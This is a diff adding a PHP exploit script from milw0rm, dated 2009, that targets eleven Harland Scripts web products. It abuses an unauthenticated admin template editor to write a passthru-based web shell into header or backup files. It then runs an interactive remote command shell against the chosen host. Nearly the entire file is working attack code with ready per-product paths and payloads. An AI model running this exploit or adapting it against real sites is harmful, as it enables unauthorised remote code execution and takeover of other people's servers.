@@ -1,0 +1,216 @@
+<?php
+//786
+/*
+==============================================================================
+                      _      _       _          _      _   _ 
+                     / \    | |     | |        / \    | | | |
+                    / _ \   | |     | |       / _ \   | |_| |
+                   / ___ \  | |___  | |___   / ___ \  |  _  |
+   IN THE NAME OF /_/   \_\ |_____| |_____| /_/   \_\ |_| |_|
+                                                             
+
+==============================================================================
+                      ____   _  _     _   _    ___    _  __
+                     / ___| | || |   | \ | |  / _ \  | |/ /
+                    | |  _  | || |_  |  \| | | | | | | ' / 
+                    | |_| | |__   _| | |\  | | |_| | | . \ 
+                     \____|    |_|   |_| \_|  \___/  |_|\_\...FROM IRAN
+
+==============================================================================
+	Harland Scripts 11 Products Remote Command Execution Exploit
+==============================================================================
+
+	[ª] Script:.............[ Harland Scripts 11 Products ]...............
+	[ª] Website:............[ http://harlandscripts.com(!) ]..............
+	[ª] Today:..............[ 1005009  ]..................................
+	[ª] Founder:............[ G4N0K | mail[.]ganok[sh!t]gmail.com ].......
+
+
+
+
+	 [+] What's going on
+	======================================
+       [0] Auth bypass...
+       [1] PHP-Code Injection...
+
+
+	 [+] Vulnerable Scripts
+	======================================
+       1 - Traffic Click 4 Cash Script
+       2 - Get A Date Script
+       3 - Birthsake Keepsake
+       4 - FFA
+       5 - TShirt Rental Script
+       6 - Mug Rental script
+       7 - Top Hits
+       8 - Recipe 6.0
+       9 - Link Lister Traffic System
+      10 - Link Back Checker Service Script
+      11 - AD PHP Script
+
+
+	 [+] SQLi & AFU
+	======================================
+	 Some of these scripts are also vulnerable to "SQLi" and "Arbitrary File Upload(Auth bypass)"...
+
+
+*/
+error_reporting(0);
+
+if (php_sapi_name() <> "cli") {
+	die("WTF, Run Me From CommandLine...");
+}
+if ($argc <> 4){__nfo();__usg();exit;}
+$hst = $argv[1];
+$pth = $argv[2];
+$prd = $argv[3];
+
+function __nfo()
+{
+$ganok = <<<EOL
+	
+        +-------------------------------------------------------------+
+        | Harland Scripts Multiple Products Command Execution Exploit |
+        |              by: G4N0K | mail[o]ganok[ta]com                |
+        |          Thanks: ALLAH, MSD, SMN, AMD, AFN, Str0ke          |
+        +-------------------------------------------------------------+
+\r\n
+EOL;
+print $ganok;
+}
+
+function __usg()
+{
+echo <<<GNK
+        uasge...:
+	
+		  xpl.php [host] [path] [product-number]
+		  xpl.php 127.0.0.1 /FFA/ 4
+		
+		  
+          Product Numbers:
+          =========================================
+          1 - Traffic Click 4 Cash Script
+          2 - Get A Date Script
+          3 - Birthsake Keepsake
+          4 - FFA
+          5 - TShirt Rental Script
+          6 - Mug Rental script
+          7 - Top Hits
+          8 - Recipe 6.0
+          9 - Link Lister Traffic System
+         10 - Link Back Checker Service Script
+         11 - AD PHP Script
+		 
+GNK;
+}
+
+function __snd($hst, $pkt)
+{
+	$socket = fsockopen($hst, 80, $errno, $errstr, 30);
+	$ggg='';
+	if (!$socket) {
+		echo "\r\n    [+] Socket err#: $errstr ($errno)\n\r";exit;
+	} else {
+		fwrite($socket, $pkt);
+		while (!feof($socket)) {
+			$g4n0k.=fgets($socket, 2048);
+		}
+		fclose($socket);
+		return $g4n0k;
+	}
+}
+
+function __srch($wt)
+{
+	$pos = strpos($wt, 'gnkgnkgnk');
+	$pos_end = strrpos($wt, 'gnkgnkgnk');
+	if (!$pos && !$pos_end){echo " [!] error...\r\n";}
+	$rest = substr($wt, $pos+9, ($pos_end - ($pos+9)));
+	return $rest;
+}
+
+	$joke = "act=save&fname=..%2Ftpl%2Fheader.php&art=%3C%3Fphp+error_reporting%280%29%3Bprint%28%22gnkgnkgnk%22%29%3Bpassthru%28%24_GET%5B%22gnk%22%5D%29%3Bprint%28%22gnkgnkgnk%22%29%3B+%3F%3E";
+	
+	__nfo();
+
+		if ($prd == 1 || $prd == 2 || $prd == 3 || $prd == 4)
+		{
+			$pth0 = "admin/template.php";
+			$pth1 = "tpl/header.php";
+		}
+		  elseif ($prd == 5 || $prd == 6)
+		{
+			$pth0 = "admin/template.php";
+			$pth1 = "templates/header.php";
+		}
+		  elseif ($prd == 7)
+		{
+			$pth0 = "admin/template.php";
+			$pth1 = "template/header.php";
+			
+		} elseif ($prd == 8)
+		{
+			$pth0 = "admin2/template.php";
+			$pth1 = "admin2/gnk.php";
+			$joke = "act=save&fname=gnk.php&art=%3C%3Fphp+error_reporting%280%29%3Bprint%28%22gnkgnkgnk%22%29%3Bpassthru%28%24_GET%5B%22gnk%22%5D%29%3Bprint%28%22gnkgnkgnk%22%29%3B+%3F%3E";
+			
+		} elseif ($prd == 9)
+		{
+			$pth0 = "admin/template.php";
+			$pth1 = "admin/backup/gnk.php";
+			$joke = "act=save&fname=backup%2Fgnk.php&art=%3C%3Fphp+error_reporting%280%29%3Bprint%28%22gnkgnkgnk%22%29%3Bpassthru%28%24_GET%5B%22gnk%22%5D%29%3Bprint%28%22gnkgnkgnk%22%29%3B+%3F%3E";
+			
+		} elseif ($prd == 10)
+		{
+			$pth0 = "admincontrol/template.php";
+			$pth1 = "admincontrol/gnk.php";
+			$joke = "act=save&fname=gnk.php&art=%3C%3Fphp+error_reporting%280%29%3Bprint%28%22gnkgnkgnk%22%29%3Bpassthru%28%24_GET%5B%22gnk%22%5D%29%3Bprint%28%22gnkgnkgnk%22%29%3B+%3F%3E";
+			
+		} elseif ($prd == 11)
+		{
+			$pth0 = "template.php";
+			$pth1 = "gnk.php";
+			$joke = "act=save&fname=gnk.php&art=%3C%3Fphp+error_reporting%280%29%3Bprint%28%22gnkgnkgnk%22%29%3Bpassthru%28%24_GET%5B%22gnk%22%5D%29%3Bprint%28%22gnkgnkgnk%22%29%3B+%3F%3E";
+			
+		} else 
+		{
+			__usg();
+			exit;
+		}
+
+	$msd_pyld  = "POST {$pth}{$pth0} HTTP/1.1\r\n";
+	$msd_pyld .= "Host: {$hst}\r\n";
+	$msd_pyld .= "Keep-Alive: 300\n\r";
+	$msd_pyld .= "Connection: keep-alive\r\n";
+	$msd_pyld .= "Content-Length: ".strlen($joke)."\r\n";
+	$msd_pyld .= "Content-Type: application/x-www-form-urlencoded\r\n\r\n";
+	$msd_pyld .= $joke;
+
+
+	echo "\r\n  [+] Trying to exploit {$hst}...";
+
+	$amd_pyld  = "GET {$pth}{$pth1} HTTP/1.1\r\n";
+	$amd_pyld .= "Host: {$hst}\r\n";
+	$amd_pyld .= "Connection: close\n\r\n\r";
+
+	if (!stristr(__snd($hst, $msd_pyld), "permission") && stristr(__snd($hst, $amd_pyld), "gnk"))
+	{
+		echo "\r\n  [+] PHP-Code has been injected...";
+		echo "\r\n  [+] Now you can exec your commands...\r\n";} else {
+		echo "\r\n  [+] Oops!, Code injection failed.\r\n"; exit;
+	}
+
+while(1)
+{
+	echo "\r\nphp-shell@{$hst}# ";
+	if (($cmd = str_replace (" ", "%20", trim(fgets(STDIN)))) == "exit") exit;
+	$smn_pyld  = "GET {$pth}{$pth1}?gnk=".$cmd." HTTP/1.1\r\n";
+	$smn_pyld .= "Host: {$hst}\r\n";
+	$smn_pyld .= "Connection: close\n\r\n\r";
+	print __srch(__snd($hst, $smn_pyld));
+}
+
+?>
+
+# milw0rm.com [2009-05-15]
